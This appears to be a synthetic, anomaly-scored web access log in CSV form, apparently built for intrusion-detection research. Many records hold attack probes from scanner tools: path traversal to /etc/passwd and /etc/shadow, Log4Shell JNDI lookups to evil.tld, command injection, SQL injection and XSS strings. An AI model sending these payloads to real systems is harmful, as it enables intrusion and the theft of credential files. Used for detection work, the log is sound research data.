score_content,score_session,score_fused,score_fused_norm,line
126.2008285522461,,126.2008285522461,126.2008285522461,{"remote_addr": "199.215.203.158", "time_local": "11/Jan/2025:09:04:48 -0700", "request": "TRACE /search?q=headphones HTTP/2", "status": 200, "body_bytes_sent": 4602, "http_referer": "https://example.com/", "http_user_agent": "curl/7.85.0"}
129.2402801513672,,129.2402801513672,129.2402801513672,{"remote_addr": "141.104.147.104", "time_local": "11/Jan/2025:09:04:49 -0700", "request": "TRACE /api/backup?file=../../../../etc/shadow HTTP/2", "status": 302, "body_bytes_sent": 362, "http_referer": "https://example.com/", "http_user_agent": "curl/7.85.0"}
16.142070770263672,,16.142070770263672,16.142070770263672,{"remote_addr": "230.232.109.178", "time_local": "11/Jan/2025:09:04:50 -0700", "request": "PUT /admin HTTP/2", "status": 302, "body_bytes_sent": 17754, "http_referer": "https://twitter.com/", "http_user_agent": "python-requests/2.31.0"}
27.16924476623535,,27.16924476623535,27.16924476623535,{"remote_addr": "141.193.176.35", "time_local": "11/Jan/2025:09:04:50 -0700", "request": "POST /?id=%24%7Bjndi%3Aldap%3A%2F%2Fevil.tld%2Fa%7D HTTP/2", "status": 200, "body_bytes_sent": 10578, "http_referer": "https://news.ycombinator.com/", "http_user_agent": "dirb/2.22"}
4.725178241729736,,4.725178241729736,4.725178241729736,{"remote_addr": "195.95.15.43", "time_local": "11/Jan/2025:09:04:51 -0700", "request": "POST /contact HTTP/2", "status": 200, "body_bytes_sent": 4595, "http_referer": "https://www.google.com/", "http_user_agent": "Wget/1.21.2 (linux-gnu)"}
101.9908218383789,,101.9908218383789,101.9908218383789,{"remote_addr": "53.190.148.224", "time_local": "11/Jan/2025:09:04:52 -0700", "request": "TRACE /..%2f..%2fetc%2fpasswd HTTP/2", "status": 200, "body_bytes_sent": 3617, "http_referer": "https://example.com/", "http_user_agent": "curl/7.85.0"}
95.01554870605469,,95.01554870605469,95.01554870605469,{"remote_addr": "134.147.153.210", "time_local": "11/Jan/2025:09:04:53 -0700", "request": "OPTIONS /search?q=router HTTP/2", "status": 200, "body_bytes_sent": 1183, "http_referer": "https://news.ycombinator.com/", "http_user_agent": "curl/7.85.0"}
11.295202255249023,,11.295202255249023,11.295202255249023,{"remote_addr": "242.211.132.20", "time_local": "11/Jan/2025:09:04:54 -0700", "request": "PUT /cgi-bin/test.cgi HTTP/2", "status": 204, "body_bytes_sent": 1310, "http_referer": "https://www.google.com/", "http_user_agent": "sqlmap/1.7.2#stable"}
2.8410890102386475,,2.8410890102386475,2.8410890102386475,{"remote_addr": "254.170.38.17", "time_local": "11/Jan/2025:09:04:54 -0700", "request": "POST /..%2f..%2fetc%2fpasswd HTTP/2", "status": 200, "body_bytes_sent": 248, "http_referer": "https://news.ycombinator.com/", "http_user_agent": "curl/7.85.0"}
5.047906398773193,,5.047906398773193,5.047906398773193,{"remote_addr": "169.115.70.28", "time_local": "11/Jan/2025:09:04:54 -0700", "request": "POST / HTTP/2", "status": 200, "body_bytes_sent": 15512, "http_referer": "https://news.ycombinator.com/", "http_user_agent": "python-requests/2.31.0"}
1.8383183479309082,,1.8383183479309082,1.8383183479309082,{"remote_addr": "29.229.102.73", "time_local": "11/Jan/2025:09:04:55 -0700", "request": "GET /server-status HTTP/2", "status": 200, "body_bytes_sent": 729, "http_referer": "https://example.com/", "http_user_agent": "nikto/2.5.0"}
30144.392578125,,30144.392578125,30144.392578125,{"remote_addr": "68.208.43.228", "time_local": "11/Jan/2025:09:04:56 -0700", "request": "POST /logout HTTP/2", "status": 403, "body_bytes_sent": 616, "http_referer": "https://news.ycombinator.com/", "http_user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"}
28.53595542907715,,28.53595542907715,28.53595542907715,{"remote_addr": "98.51.102.213", "time_local": "11/Jan/2025:09:04:56 -0700", "request": "DELETE /index.html HTTP/2", "status": 304, "body_bytes_sent": 14646, "http_referer": "https://twitter.com/", "http_user_agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"}
69.36393737792969,,69.36393737792969,69.36393737792969,{"remote_addr": "194.142.1.7", "time_local": "11/Jan/2025:09:04:57 -0700", "request": "HEAD /search?q=%27+OR+1%3D1+-- HTTP/2", "status": 200, "body_bytes_sent": 15559, "http_referer": "https://www.google.com/", "http_user_agent": "dirb/2.22"}
0.22474093735218048,,0.22474093735218048,0.22474093735218048,{"remote_addr": "25.57.220.199", "time_local": "11/Jan/2025:09:04:58 -0700", "request": "GET /assets/app.js HTTP/2", "status": 200, "body_bytes_sent": 5220, "http_referer": "https://twitter.com/", "http_user_agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"}
72.49440002441406,,72.49440002441406,72.49440002441406,{"remote_addr": "201.182.152.162", "time_local": "11/Jan/2025:09:04:59 -0700", "request": "HEAD /?id=%24%7Bjndi%3Aldap%3A%2F%2Fevil.tld%2Fa%7D HTTP/2", "status": 304, "body_bytes_sent": 10869, "http_referer": "https://www.google.com/", "http_user_agent": "sqlmap/1.7.2#stable"}
11.306105613708496,,11.306105613708496,11.306105613708496,{"remote_addr": "200.72.128.164", "time_local": "11/Jan/2025:09:05:00 -0700", "request": "PUT /../../etc/passwd HTTP/2", "status": 200, "body_bytes_sent": 6160, "http_referer": "https://www.google.com/", "http_user_agent": "dirb/2.22"}
35.473899841308594,,35.473899841308594,35.473899841308594,{"remote_addr": "187.99.162.110", "time_local": "11/Jan/2025:09:05:01 -0700", "request": "PUT /search?q=camera HTTP/2", "status": 200, "body_bytes_sent": 2668, "http_referer": "https://example.com/", "http_user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"}
38.398441314697266,,38.398441314697266,38.398441314697266,{"remote_addr": "108.254.218.45", "time_local": "11/Jan/2025:09:05:02 -0700", "request": "PUT /api/run?cmd=cat+%2Fetc%2Fpasswd HTTP/2", "status": 304, "body_bytes_sent": 14706, "http_referer": "https://news.ycombinator.com/", "http_user_agent": "curl/7.85.0"}
24.44427490234375,,24.44427490234375,24.44427490234375,{"remote_addr": "201.97.140.251", "time_local": "11/Jan/2025:09:05:02 -0700", "request": "GET /?id=%24%7Bjndi%3Aldap%3A%2F%2Fevil.tld%2Fa%7D HTTP/2", "status": 200, "body_bytes_sent": 8702, "http_referer": "https://www.google.com/", "http_user_agent": "nikto/2.5.0"}
3.1434996128082275,,3.1434996128082275,3.1434996128082275,{"remote_addr": "200.235.160.58", "time_local": "11/Jan/2025:09:05:03 -0700", "request": "GET /assets/app.css HTTP/2", "status": 304, "body_bytes_sent": 14038, "http_referer": "https://twitter.com/", "http_user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"}
95.02754211425781,,95.02754211425781,95.02754211425781,{"remote_addr": "62.4.133.150", "time_local": "11/Jan/2025:09:05:04 -0700", "request": "OPTIONS /search?q=monitor HTTP/2", "status": 200, "body_bytes_sent": 16281, "http_referer": "https://news.ycombinator.com/", "http_user_agent": "python-requests/2.31.0"}
103.83988952636719,,103.83988952636719,103.83988952636719,{"remote_addr": "244.39.118.82", "time_local": "11/Jan/2025:09:05:05 -0700", "request": "TRACE /phpmyadmin HTTP/2", "status": 200, "body_bytes_sent": 4174, "http_referer": "https://twitter.com/", "http_user_agent": "python-requests/2.31.0"}
28.30994987487793,,28.30994987487793,28.30994987487793,{"remote_addr": "203.72.250.207", "time_local": "11/Jan/2025:09:05:05 -0700", "request": "DELETE /../../etc/passwd HTTP/2", "status": 302, "body_bytes_sent": 3492, "http_referer": "https://twitter.com/", "http_user_agent": "nikto/2.5.0"}
0.21254853904247284,,0.21254853904247284,0.21254853904247284,{"remote_addr": "153.24.142.110", "time_local": "11/Jan/2025:09:05:06 -0700", "request": "GET /assets/app.css HTTP/2", "status": 200, "body_bytes_sent": 8922, "http_referer": "https://twitter.com/", "http_user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"}
0.25671660900115967,,0.25671660900115967,0.25671660900115967,{"remote_addr": "125.214.230.195", "time_local": "11/Jan/2025:09:05:07 -0700", "request": "GET /assets/app.js HTTP/2", "status": 200, "body_bytes_sent": 15544, "http_referer": "https://twitter.com/", "http_user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"}
47.084774017333984,,47.084774017333984,47.084774017333984,{"remote_addr": "246.10.198.240", "time_local": "11/Jan/2025:09:05:07 -0700", "request": "HEAD /api/products HTTP/2", "status": 200, "body_bytes_sent": 1391, "http_referer": "https://www.google.com/", "http_user_agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"}
95.01216125488281,,95.01216125488281,95.01216125488281,{"remote_addr": "36.97.68.31", "time_local": "11/Jan/2025:09:05:08 -0700", "request": "OPTIONS /search?q=monitor HTTP/2", "status": 200, "body_bytes_sent": 10904, "http_referer": "https://www.google.com/", "http_user_agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"}
30234.591796875,,30234.591796875,30234.591796875,{"remote_addr": "228.183.10.247", "time_local": "11/Jan/2025:09:05:08 -0700", "request": "OPTIONS /api/product?id=123 HTTP/2", "status": 401, "body_bytes_sent": 1321, "http_referer": "https://example.com/", "http_user_agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"}
30167.26953125,,30167.26953125,30167.26953125,{"remote_addr": "50.223.219.223", "time_local": "11/Jan/2025:09:05:09 -0700", "request": "DELETE / HTTP/2", "status": 404, "body_bytes_sent": 342, "http_referer": "https://example.com/", "http_user_agent": "python-requests/2.31.0"}
69.52381896972656,,69.52381896972656,69.52381896972656,{"remote_addr": "219.41.147.148", "time_local": "11/Jan/2025:09:05:10 -0700", "request": "HEAD /api/product?id=123 HTTP/2", "status": 200, "body_bytes_sent": 8850, "http_referer": "https://news.ycombinator.com/", "http_user_agent": "Wget/1.21.2 (linux-gnu)"}
49.61582946777344,,49.61582946777344,49.61582946777344,{"remote_addr": "139.70.29.153", "time_local": "11/Jan/2025:09:05:10 -0700", "request": "DELETE /search?q=laptop HTTP/2", "status": 200, "body_bytes_sent": 5126, "http_referer": "https://example.com/", "http_user_agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"}
13.18536376953125,,13.18536376953125,13.18536376953125,{"remote_addr": "215.199.122.98", "time_local": "11/Jan/2025:09:05:10 -0700", "request": "PUT /contact HTTP/2", "status": 200, "body_bytes_sent": 15064, "http_referer": "https://news.ycombinator.com/", "http_user_agent": "nikto/2.5.0"}
7.739517688751221,,7.739517688751221,7.739517688751221,{"remote_addr": "95.112.233.92", "time_local": "11/Jan/2025:09:05:11 -0700", "request": "POST /login HTTP/2", "status": 304, "body_bytes_sent": 12334, "http_referer": "-", "http_user_agent": "python-requests/2.31.0"}
4.778310775756836,,4.778310775756836,4.778310775756836,{"remote_addr": "95.167.130.150", "time_local": "11/Jan/2025:09:05:12 -0700", "request": "POST /logout HTTP/2", "status": 200, "body_bytes_sent": 9765, "http_referer": "https://example.com/", "http_user_agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"}
4.983817100524902,,4.983817100524902,4.983817100524902,{"remote_addr": "127.168.83.86", "time_local": "11/Jan/2025:09:05:12 -0700", "request": "GET /login HTTP/2", "status": 302, "body_bytes_sent": 13432, "http_referer": "-", "http_user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"}
24.427223205566406,,24.427223205566406,24.427223205566406,{"remote_addr": "80.164.25.181", "time_local": "11/Jan/2025:09:05:12 -0700", "request": "GET /?id=%24%7Bjndi%3Aldap%3A%2F%2Fevil.tld%2Fa%7D HTTP/2", "status": 200, "body_bytes_sent": 3103, "http_referer": "https://www.google.com/", "http_user_agent": "curl/7.85.0"}
50.018638610839844,,50.018638610839844,50.018638610839844,{"remote_addr": "171.74.41.136", "time_local": "11/Jan/2025:09:05:13 -0700", "request": "HEAD /dashboard HTTP/2", "status": 304, "body_bytes_sent": 16391, "http_referer": "https://twitter.com/", "http_user_agent": "Wget/1.21.2 (linux-gnu)"}
30186.7265625,,30186.7265625,30186.7265625,{"remote_addr": "226.240.164.45", "time_local": "11/Jan/2025:09:05:14 -0700", "request": "HEAD /logout HTTP/2", "status": 401, "body_bytes_sent": 449, "http_referer": "https://example.com/", "http_user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"}
30163.962890625,,30163.962890625,30163.962890625,{"remote_addr": "96.175.201.226", "time_local": "11/Jan/2025:09:05:14 -0700", "request": "GET /search?q=camera HTTP/2", "status": 403, "body_bytes_sent": 608, "http_referer": "-", "http_user_agent": "dirb/2.22"}
104.99435424804688,,104.99435424804688,104.99435424804688,{"remote_addr": "239.87.196.197", "time_local": "11/Jan/2025:09:05:15 -0700", "request": "TRACE /cgi-bin/test.cgi HTTP/2", "status": 302, "body_bytes_sent": 11455, "http_referer": "https://example.com/", "http_user_agent": "dirb/2.22"}
49.61568832397461,,49.61568832397461,49.61568832397461,{"remote_addr": "224.46.51.15", "time_local": "11/Jan/2025:09:05:16 -0700", "request": "DELETE /search?q=router HTTP/2", "status": 200, "body_bytes_sent": 5083, "http_referer": "https://example.com/", "http_user_agent": "dirb/2.22"}
13.157769203186035,,13.157769203186035,13.157769203186035,{"remote_addr": "28.179.90.47", "time_local": "11/Jan/2025:09:05:17 -0700", "request": "PUT /profile HTTP/2", "status": 200, "body_bytes_sent": 1056, "http_referer": "https://example.com/", "http_user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"}
4.929641246795654,,4.929641246795654,4.929641246795654,{"remote_addr": "184.136.203.162", "time_local": "11/Jan/2025:09:05:17 -0700", "request": "GET /profile HTTP/2", "status": 304, "body_bytes_sent": 7067, "http_referer": "-", "http_user_agent": "sqlmap/1.7.2#stable"}
27.100934982299805,,27.100934982299805,27.100934982299805,{"remote_addr": "65.27.133.15", "time_local": "11/Jan/2025:09:05:18 -0700", "request": "POST /api/product?id=123 HTTP/2", "status": 200, "body_bytes_sent": 4572, "http_referer": "-", "http_user_agent": "nikto/2.5.0"}
30141.65625,,30141.65625,30141.65625,{"remote_addr": "15.79.229.49", "time_local": "11/Jan/2025:09:05:19 -0700", "request": "GET /contact HTTP/2", "status": 403, "body_bytes_sent": 363, "http_referer": "https://twitter.com/", "http_user_agent": "Wget/1.21.2 (linux-gnu)"}
49.61358642578125,,49.61358642578125,49.61358642578125,{"remote_addr": "8.46.238.63", "time_local": "11/Jan/2025:09:05:20 -0700", "request": "DELETE /api/run?cmd=cat+%2Fetc%2Fpasswd HTTP/2", "status": 200, "body_bytes_sent": 12687, "http_referer": "https://www.google.com/", "http_user_agent": "sqlmap/1.7.2#stable"}
3.074650526046753,,3.074650526046753,3.074650526046753,{"remote_addr": "239.63.227.208", "time_local": "11/Jan/2025:09:05:20 -0700", "request": "GET /assets/app.js HTTP/2", "status": 301, "body_bytes_sent": 2340, "http_referer": "https://www.google.com/", "http_user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"}
70.91799926757812,,70.91799926757812,70.91799926757812,{"remote_addr": "161.135.94.227", "time_local": "11/Jan/2025:09:05:21 -0700", "request": "OPTIONS /wp-login.php HTTP/2", "status": 200, "body_bytes_sent": 2412, "http_referer": "-", "http_user_agent": "nikto/2.5.0"}
4.541956424713135,,4.541956424713135,4.541956424713135,{"remote_addr": "235.38.58.140", "time_local": "11/Jan/2025:09:05:22 -0700", "request": "POST /server-status HTTP/2", "status": 200, "body_bytes_sent": 4173, "http_referer": "https://news.ycombinator.com/", "http_user_agent": "nikto/2.5.0"}
2.0317537784576416,,2.0317537784576416,2.0317537784576416,{"remote_addr": "128.105.3.52", "time_local": "11/Jan/2025:09:05:23 -0700", "request": "GET /profile HTTP/2", "status": 200, "body_bytes_sent": 12576, "http_referer": "https://news.ycombinator.com/", "http_user_agent": "sqlmap/1.7.2#stable"}
72.43602752685547,,72.43602752685547,72.43602752685547,{"remote_addr": "167.233.72.38", "time_local": "11/Jan/2025:09:05:24 -0700", "request": "HEAD /?id=%24%7Bjndi%3Aldap%3A%2F%2Fevil.tld%2Fa%7D HTTP/2", "status": 302, "body_bytes_sent": 1242, "http_referer": "https://example.com/", "http_user_agent": "sqlmap/1.7.2#stable"}
30142.775390625,,30142.775390625,30142.775390625,{"remote_addr": "204.66.199.225", "time_local": "11/Jan/2025:09:05:24 -0700", "request": "POST /index.html HTTP/2", "status": 403, "body_bytes_sent": 81, "http_referer": "https://www.google.com/", "http_user_agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"}
126.35662078857422,,126.35662078857422,126.35662078857422,{"remote_addr": "11.25.158.168", "time_local": "11/Jan/2025:09:05:25 -0700", "request": "TRACE /api/product?id=123 HTTP/2", "status": 200, "body_bytes_sent": 14430, "http_referer": "https://example.com/", "http_user_agent": "python-requests/2.31.0"}
73.86143493652344,,73.86143493652344,73.86143493652344,{"remote_addr": "148.246.69.79", "time_local": "11/Jan/2025:09:05:26 -0700", "request": "OPTIONS /index.html HTTP/2", "status": 302, "body_bytes_sent": 4055, "http_referer": "https://example.com/", "http_user_agent": "curl/7.85.0"}
3.0946474075317383,,3.0946474075317383,3.0946474075317383,{"remote_addr": "93.75.143.136", "time_local": "11/Jan/2025:09:05:27 -0700", "request": "GET /assets/app.js HTTP/2", "status": 302, "body_bytes_sent": 2101, "http_referer": "https://twitter.com/", "http_user_agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"}
95.00395202636719,,95.00395202636719,95.00395202636719,{"remote_addr": "224.169.93.210", "time_local": "11/Jan/2025:09:05:28 -0700", "request": "OPTIONS /search?q=monitor HTTP/2", "status": 200, "body_bytes_sent": 8339, "http_referer": "https://twitter.com/", "http_user_agent": "sqlmap/1.7.2#stable"}
24.562152862548828,,24.562152862548828,24.562152862548828,{"remote_addr": "128.128.242.42", "time_local": "11/Jan/2025:09:05:29 -0700", "request": "GET /search?q=%3Cscript%3Ealert%281%29%3C%2Fscript%3E HTTP/2", "status": 200, "body_bytes_sent": 17135, "http_referer": "https://twitter.com/", "http_user_agent": "sqlmap/1.7.2#stable"}
0.2728520631790161,,0.2728520631790161,0.2728520631790161,{"remote_addr": "213.180.115.55", "time_local": "11/Jan/2025:09:05:30 -0700", "request": "GET /.git/config HTTP/2", "status": 200, "body_bytes_sent": 2841, "http_referer": "https://news.ycombinator.com/", "http_user_agent": "python-requests/2.31.0"}
102.21501159667969,,102.21501159667969,102.21501159667969,{"remote_addr": "88.241.11.197", "time_local": "11/Jan/2025:09:05:31 -0700", "request": "TRACE /.git/config HTTP/2", "status": 200, "body_bytes_sent": 7025, "http_referer": "https://twitter.com/", "http_user_agent": "curl/7.85.0"}
16.136598587036133,,16.136598587036133,16.136598587036133,{"remote_addr": "18.42.125.166", "time_local": "11/Jan/2025:09:05:32 -0700", "request": "PUT /about HTTP/2", "status": 302, "body_bytes_sent": 15660, "http_referer": "https://example.com/", "http_user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"}
25.55766487121582,,25.55766487121582,25.55766487121582,{"remote_addr": "179.112.172.176", "time_local": "11/Jan/2025:09:05:32 -0700", "request": "DELETE /wp-login.php HTTP/2", "status": 200, "body_bytes_sent": 13260, "http_referer": "https://example.com/", "http_user_agent": "dirb/2.22"}
72.53866577148438,,72.53866577148438,72.53866577148438,{"remote_addr": "7.21.136.71", "time_local": "11/Jan/2025:09:05:33 -0700", "request": "OPTIONS /server-status HTTP/2", "status": 200, "body_bytes_sent": 17707, "http_referer": "https://twitter.com/", "http_user_agent": "nikto/2.5.0"}
7.572035312652588,,7.572035312652588,7.572035312652588,{"remote_addr": "139.206.242.159", "time_local": "11/Jan/2025:09:05:34 -0700", "request": "POST /dashboard HTTP/2", "status": 302, "body_bytes_sent": 17410, "http_referer": "https://example.com/", "http_user_agent": "sqlmap/1.7.2#stable"}
95.02584838867188,,95.02584838867188,95.02584838867188,{"remote_addr": "34.171.190.41", "time_local": "11/Jan/2025:09:05:35 -0700", "request": "OPTIONS /search?q=camera HTTP/2", "status": 200, "body_bytes_sent": 8585, "http_referer": "https://www.google.com/", "http_user_agent": "dirb/2.22"}
30234.80078125,,30234.80078125,30234.80078125,{"remote_addr": "59.151.127.62", "time_local": "11/Jan/2025:09:05:35 -0700", "request": "OPTIONS /search?q=ssd HTTP/2", "status": 403, "body_bytes_sent": 114, "http_referer": "https://example.com/", "http_user_agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"}
49.844017028808594,,49.844017028808594,49.844017028808594,{"remote_addr": "109.37.251.205", "time_local": "11/Jan/2025:09:05:35 -0700", "request": "DELETE /search?q=%3Cscript%3Ealert%281%29%3C%2Fscript%3E HTTP/2", "status": 200, "body_bytes_sent": 16746, "http_referer": "https://twitter.com/", "http_user_agent": "curl/7.85.0"}
30241.96875,,30241.96875,30241.96875,{"remote_addr": "53.249.188.148", "time_local": "11/Jan/2025:09:05:36 -0700", "request": "TRACE /index.html HTTP/2", "status": 403, "body_bytes_sent": 118, "http_referer": "-", "http_user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"}
30189.087890625,,30189.087890625,30189.087890625,{"remote_addr": "141.88.220.206", "time_local": "11/Jan/2025:09:05:37 -0700", "request": "DELETE /search?q=headphones HTTP/2", "status": 401, "body_bytes_sent": 601, "http_referer": "https://example.com/", "http_user_agent": "python-requests/2.31.0"}
3.117053747177124,,3.117053747177124,3.117053747177124,{"remote_addr": "67.74.89.227", "time_local": "11/Jan/2025:09:05:38 -0700", "request": "GET /assets/app.css HTTP/2", "status": 304, "body_bytes_sent": 5645, "http_referer": "-", "http_user_agent": "sqlmap/1.7.2#stable"}
71.0307388305664,,71.0307388305664,71.0307388305664,{"remote_addr": "37.84.254.186", "time_local": "11/Jan/2025:09:05:38 -0700", "request": "OPTIONS /.git/config HTTP/2", "status": 200, "body_bytes_sent": 170, "http_referer": "https://news.ycombinator.com/", "http_user_agent": "dirb/2.22"}
30.492265701293945,,30.492265701293945,30.492265701293945,{"remote_addr": "214.151.119.72", "time_local": "11/Jan/2025:09:05:39 -0700", "request": "DELETE / HTTP/2", "status": 304, "body_bytes_sent": 4208, "http_referer": "https://twitter.com/", "http_user_agent": "dirb/2.22"}
30163.998046875,,30163.998046875,30163.998046875,{"remote_addr": "67.193.198.62", "time_local": "11/Jan/2025:09:05:40 -0700", "request": "GET /api/user?id=1;DROP TABLE users HTTP/2", "status": 403, "body_bytes_sent": 1073, "http_referer": "https://example.com/", "http_user_agent": "curl/7.85.0"}
2.3087761402130127,,2.3087761402130127,2.3087761402130127,{"remote_addr": "181.248.171.87", "time_local": "11/Jan/2025:09:05:40 -0700", "request": "GET / HTTP/2", "status": 200, "body_bytes_sent": 8759, "http_referer": "-", "http_user_agent": "sqlmap/1.7.2#stable"}
49.673404693603516,,49.673404693603516,49.673404693603516,{"remote_addr": "122.150.161.62", "time_local": "11/Jan/2025:09:05:41 -0700", "request": "DELETE /search?q=phone HTTP/2", "status": 200, "body_bytes_sent": 16499, "http_referer": "-", "http_user_agent": "Wget/1.21.2 (linux-gnu)"}
35.52476119995117,,35.52476119995117,35.52476119995117,{"remote_addr": "238.227.252.24", "time_local": "11/Jan/2025:09:05:42 -0700", "request": "PUT /api/product?id=123 HTTP/2", "status": 200, "body_bytes_sent": 2262, "http_referer": "https://twitter.com/", "http_user_agent": "sqlmap/1.7.2#stable"}
1.9272383451461792,,1.9272383451461792,1.9272383451461792,{"remote_addr": "123.52.49.89", "time_local": "11/Jan/2025:09:05:42 -0700", "request": "GET /phpmyadmin HTTP/2", "status": 200, "body_bytes_sent": 10618, "http_referer": "https://twitter.com/", "http_user_agent": "dirb/2.22"}
72.75946807861328,,72.75946807861328,72.75946807861328,{"remote_addr": "197.54.97.224", "time_local": "11/Jan/2025:09:05:42 -0700", "request": "OPTIONS /about HTTP/2", "status": 200, "body_bytes_sent": 5762, "http_referer": "https://twitter.com/", "http_user_agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"}
47.10508728027344,,47.10508728027344,47.10508728027344,{"remote_addr": "241.177.150.138", "time_local": "11/Jan/2025:09:05:44 -0700", "request": "HEAD /api/products HTTP/2", "status": 200, "body_bytes_sent": 11037, "http_referer": "https://example.com/", "http_user_agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"}
2.002394676208496,,2.002394676208496,2.002394676208496,{"remote_addr": "36.184.68.223", "time_local": "11/Jan/2025:09:05:44 -0700", "request": "GET /profile HTTP/2", "status": 200, "body_bytes_sent": 2226, "http_referer": "-", "http_user_agent": "sqlmap/1.7.2#stable"}
24.366243362426758,,24.366243362426758,24.366243362426758,{"remote_addr": "99.229.118.59", "time_local": "11/Jan/2025:09:05:44 -0700", "request": "GET /search?q=phone HTTP/2", "status": 200, "body_bytes_sent": 8304, "http_referer": "https://news.ycombinator.com/", "http_user_agent": "nikto/2.5.0"}
103.85586547851562,,103.85586547851562,103.85586547851562,{"remote_addr": "74.190.96.21", "time_local": "11/Jan/2025:09:05:45 -0700", "request": "TRACE /phpmyadmin HTTP/2", "status": 200, "body_bytes_sent": 9188, "http_referer": "https://news.ycombinator.com/", "http_user_agent": "sqlmap/1.7.2#stable"}
75.70561981201172,,75.70561981201172,75.70561981201172,{"remote_addr": "128.215.150.137", "time_local": "11/Jan/2025:09:05:46 -0700", "request": "OPTIONS /about HTTP/2", "status": 304, "body_bytes_sent": 13292, "http_referer": "https://news.ycombinator.com/", "http_user_agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"}
24.369915008544922,,24.369915008544922,24.369915008544922,{"remote_addr": "247.127.208.231", "time_local": "11/Jan/2025:09:05:47 -0700", "request": "GET /search?q=camera HTTP/2", "status": 200, "body_bytes_sent": 17324, "http_referer": "https://twitter.com/", "http_user_agent": "curl/7.85.0"}
95.01213836669922,,95.01213836669922,95.01213836669922,{"remote_addr": "66.72.129.131", "time_local": "11/Jan/2025:09:05:48 -0700", "request": "OPTIONS /search?q=laptop HTTP/2", "status": 200, "body_bytes_sent": 4386, "http_referer": "https://news.ycombinator.com/", "http_user_agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"}
